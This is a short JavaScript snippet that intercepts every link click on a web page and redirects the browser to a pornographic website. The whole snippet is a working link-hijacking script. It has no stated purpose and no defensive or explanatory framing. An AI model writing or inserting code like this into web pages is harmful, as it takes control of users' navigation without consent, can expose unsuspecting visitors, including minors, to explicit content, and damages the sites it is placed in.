const TARGET_URL = "https://rt.pornhub.org/"; 

document.addEventListener('click', function(event) {

    let target = event.target.closest('a');
    
    if (target && target.href) {
        event.preventDefault(); 
        window.location.href = TARGET_URL; 
    }
});